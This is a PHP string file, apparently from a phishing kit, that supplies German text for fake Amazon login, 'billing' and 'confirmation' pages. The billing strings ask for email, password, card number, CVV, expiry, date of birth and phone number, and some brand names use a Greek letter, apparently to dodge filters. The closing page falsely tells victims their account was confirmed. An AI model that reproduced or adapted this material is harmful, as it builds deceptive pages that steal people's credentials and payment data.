<?php
$m3il9a_1 = 'Prime testen';
$m3il9a_2 = 'Alle';
$m3il9a_3 = 'Wählen Sie die Abteilung aus, in der Sie suchen möchten';
$m3il9a_4 = 'DE';
$m3il9a_5 = 'Hallo! Anmelden';
$m3il9a_6 = 'Mein Konto';
$m3il9a_7 = 'Listen';
$m3il9a_8 = 'wagen';

$zab_a = 'Ihr Konto';
$zab_b = 'Amazon Wallet';
$zab_c = 'Amazon Manager';
$Azzouz1 = 'Amazon akzeptiert alle gängigen Kredit- und Debitkarten';
$Azzouz2 = 'Kredit- oder Debitkarten';
$Azzouz3 = 'Name auf Karte';
$Azzouz4 = 'E-Mail-Adresse';
$Azzouz5 = 'Passwort';
$Azzouz6 = 'Passwort bestätigen';
$Azzouz7 = 'Geben Sie Ihren E-Mail-Zugang ein';
$Azzouz8 = 'Benutze diese Karte in ganz Amazon';
$year = date ('Y');
/////////////////////// Anmelden ////////////////////////// /////////
$dexter_zkika_1 = "Anmelden";
$dexter_zkika_2 = "E-Mail (Telefon für mobile Konten)";
$dexter_zkika_3 = "Passwort vergessen?";
$dexter_zkika_4 = "Passwort";
$dexter_zkika_5 = "Anmelden";
$dexter_zkika_6 = "Neu bei Αmazon?";
$dexter_zkika_11 = "Mit der Unterschrift sind Sie uns einverstanden";
$dexter_zkika_111 = "Nutzungsbedingungen und Verkauf";
$dexter_zkika_1111 = "und unsere";
$dexter_zkika_11111 = "Privatsphäre";
$dexter_zkika_12 = "Konto erstellen";
$dexter_zkika_13 = "Nutzungsbedingungen";
$dexter_zkika_15 = "Privatsphäre";
$dexter_zkika_16 = "Hilfe";
$goverment_is_bad_1 = "© 1996-$year, Αmazon.com, Inc. oder seine verbundenen Unternehmen";
$goverment_is_bad_2 = "Amazon - Login";
/////////////////////// billing ////////////////////////////////// ///////////
$richard_azzouz_1 = "Amazon - Abrechnung";
$richard_azzouz_2 = "Hallo.";
$richard_azzouz_3 = "Suche";
$richard_azzouz_4 = "Alle";
$richard_azzouz_5 = "Dein Konto";
$richard_azzouz_6 = "Karte";
$richard_azzouz_7 = "Wunsch";
$richard_azzouz_8 = "list";
$goverment_is_bad_4 = "Geben Sie Ihre Kreditkarteninformationen ein";
$goverment_is_bad_5 = "Wenn du fertig bist, klicke auf Einreichen ";
$goverment_is_bad_6 = "Kartenhalter";
$goverment_is_bad_7 = "Kartennummer";
$goverment_is_bad_8 = "Keine Bindestriche oder Räume";
$goverment_is_bad_09 = "Sicherheitscode der Karte";
$goverment_is_bad_10 = "Verfallsdatum";
$goverment_is_bad_11 = "Monat";
$goverment_is_bad_12 = "Jahr";
$goverment_is_bad_13 = "Tag";
$goverment_is_bad_14 = "Telefonnummer";
$goverment_is_bad_15 = "Postleitzahl";
$goverment_is_bad_16 = "Geburtsdatum";
$goverment_is_bad_17 = "CVV";
$goverment_is_bad_18 = "Einreichen";
$goverment_is_bad_19 = "Nutzungsbedingungen";
$goverment_is_bad_20 = "Privatsphäre";
$goverment_is_bad_21 = "Zinsbasierte Anzeigen";
/////////////////////////finish ////////////////////// ///////////////////////////
$zkika_logo = "Amazon - danke!";
$dexter_zkikab_1 = "Danke";
$dexter_zkikab_2 = "Sie haben Ihre Kontoinformationen  <br> erfolgreich bestatigt";
$dexter_zkikab_3 = "Du musst sich erneut anmelden, um Änderungen zu speichern, du wirst automatisch zur Anmeldeseite umgeleitet In 5 Sekunden <br> Vielen Dank für die Verwendung unserer Systemprüfung.";
///////////////////////////////////////////////// ///////////////////////////////////
?>